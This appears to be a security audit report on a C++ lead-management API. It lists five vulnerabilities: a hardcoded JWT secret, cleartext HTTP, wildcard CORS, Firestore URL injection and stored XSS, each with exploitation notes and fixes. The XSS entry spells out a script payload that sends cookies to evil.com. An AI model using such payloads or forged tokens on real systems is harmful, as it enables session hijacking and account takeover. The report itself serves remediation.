--- Vulnerability #1 ---
CWE ID: CWE-798
Name: Hardcoded Credentials / Secret Key
Severity: Critical
File: src/main.cpp
Line: 15
Description:
The JWT signing secret is hardcoded directly in the source code as a string
literal: "lead-manager-jwt-secret-change-in-production". The default value is
used unless explicitly overridden via the --secret command-line argument. If
deployed without changing this value, all JWT tokens can be forged by any
attacker who reads the source code or binary.
Exploitation:
An attacker who knows this default secret can craft arbitrary JWT tokens,
impersonating any user in the system, gaining full access to all leads and
accounts. The string can be extracted from compiled binaries using `strings`.

--- Vulnerability #2 ---
CWE ID: CWE-319
Name: Cleartext Transmission of Sensitive Data (No HTTPS Enforcement)
Severity: High
File: src/main.cpp
Lines: 36, 88
Description:
The server is instantiated as a plain httplib::Server (not httplib::SSLServer),
meaning it listens on HTTP without TLS encryption. All traffic, including
authentication credentials, JWT tokens, and lead data, is transmitted in
cleartext.
Exploitation:
An attacker performing network sniffing (e.g., on a shared WiFi network or
via ARP spoofing) can intercept all usernames, passwords, JWT tokens, and
business data in transit. Captured JWT tokens allow full account takeover.

--- Vulnerability #3 ---
CWE ID: CWE-942
Name: Overly Permissive CORS Configuration
Severity: High
File: src/main.cpp
Lines: 38-42
Description:
The server sets "Access-Control-Allow-Origin" to "*", allowing any website on
the internet to make cross-origin requests to the API. Combined with
"Access-Control-Allow-Headers" including "Authorization", any malicious website
can make authenticated API calls on behalf of a user whose browser has a valid
token.
Exploitation:
An attacker hosts a malicious webpage that makes AJAX requests to the Lead
Manager API. If a victim with a valid JWT token visits this page, the attacker's
JavaScript can read, modify, and delete all of the victim's leads via cross-
origin requests.

--- Vulnerability #4 ---
CWE ID: CWE-918
Name: Server-Side Request Forgery (SSRF) via Unsanitized Path Components
Severity: High
File: src/firebase_client.cpp
Lines: 136, 152, 168, 181, 191-193
Description:
The collection name and document ID parameters are concatenated directly into
URL paths sent to the Firestore API without any sanitization or validation.
In update_document (line 170), field names from user input are concatenated
directly into query string parameters (updateMask.fieldPaths=), allowing query
parameter injection.
Exploitation:
An attacker could craft a document ID containing path traversal characters or
additional query parameters to manipulate Firestore API requests. Injecting a
field name containing "&" could add arbitrary query parameters to the Firestore
request.

--- Vulnerability #5 ---
CWE ID: CWE-79
Name: Stored Cross-Site Scripting (XSS) via Lead Data
Severity: High
File: src/lead_controller.cpp
Lines: 37-50, 67, 190
Description:
Lead data (full_name, email, phone, company, position, source, notes) is
stored and returned without any output encoding or sanitization. The
application serves a static directory, suggesting a frontend that consumes
this API data. If the frontend renders any of these fields without proper
escaping, stored XSS attacks are possible. The server sets no Content-Security-
Policy headers.
Exploitation:
An attacker creates a lead with a full_name such as
"<script>document.location='http://evil.com/?c='+document.cookie</script>".
When another user views this lead in the frontend, the script executes in
their browser, allowing cookie theft or session hijacking.

================================================================================
RECOMMENDATIONS
================================================================================

1. CRITICAL: Move all secrets to environment variables; never hardcode them.
2. HIGH: Enable HTTPS via httplib::SSLServer or a TLS-terminating reverse proxy.
3. HIGH: Restrict CORS to specific trusted origins instead of wildcard "*".
4. HIGH: Sanitize and validate document IDs and field names before using them
   in Firestore API URL paths and query parameters.
5. HIGH: Add input validation and output encoding for all user-supplied data.
